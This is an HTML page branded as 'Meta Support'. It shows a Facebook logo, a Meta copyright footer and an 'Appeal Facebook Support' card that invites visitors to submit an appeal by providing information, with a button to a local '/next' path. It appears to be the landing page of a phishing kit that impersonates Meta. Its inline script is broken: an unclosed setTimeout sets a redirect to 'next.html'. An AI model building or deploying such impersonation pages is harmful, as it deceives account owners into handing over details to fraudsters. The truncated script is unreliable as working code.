<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Meta Support</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      font-family: system-ui, Arial, sans-serif;
      margin: 0;
      padding: 0;
      background-color: #F5F6F6;
      color: #333;
    }
    .header {
      background-color: #1877F2;
      color: white;
      padding: 1rem;
      text-align: center;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 1rem;
    }
    .header img {
      width: 3rem;
      height: auto;
    }
    .header h1 {
      font-size: 1.75rem;
      margin: 0;
    }
    .main-content {
      display: flex;
      justify-content: center;
      align-items: center;
      height: calc(100vh - 4rem); /* Adjust height based on header and footer height */
      padding: 2rem;
    }
    .card {
      background-color: white;
      border-radius: 8px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
      padding: 2rem;
      max-width: 600px;
      width: 100%;
      text-align: center;
    }
    .card h2 {
      font-size: 1.5rem;
      margin-bottom: 1rem;
    }
    .card p {
      font-size: 1rem;
      margin-bottom: 1.5rem;
    }
    .btn-custom {
      background-color: #1877F2;
      color: white;
      border-radius: 50px;
      padding: 0.75rem 2rem;
      font-size: 1rem;
      text-decoration: none;
      display: inline-block;
      transition: background-color 0.3s;
    }
    .btn-custom:hover {
      background-color: #005bb5;
    }
    .footer {
      background-color: #E9EBEE;
      padding: 1rem;
      text-align: center;
      font-size: 0.9rem;
      color: #606770;
      box-shadow: 0 -2px 6px rgba(0, 0, 0, 0.1);
    }
    .link {
      color: #1877F2;
      text-decoration: none;
    }
    .link:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="header">
    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png" alt="Meta Logo">
    <h1>Meta Support</h1>
  </div>
  <div class="main-content">
    <div class="card">
      <h2>Appeal Facebook Support</h2>
      <p>If you believe this to be a mistake, you have the option to submit an appeal by providing the necessary information.</p>
      <a class='btn-custom' href='/next'>Appeal</a>
      <p class="mt-4">Request for creator</p>
      <p><strong>Are you a business?</strong> Get more information on <a href="#" class="link">Meta support for businesses</a></p>
      <p class="font-italic region-info"></p>
    </div>
  </div>
  <div class="footer">
    Â© 2024 Meta Platforms, Inc.
  </div>
</body>
<script>
  setTimeout(function() {
    var redirectURL = "next.html";
</script>
</html>
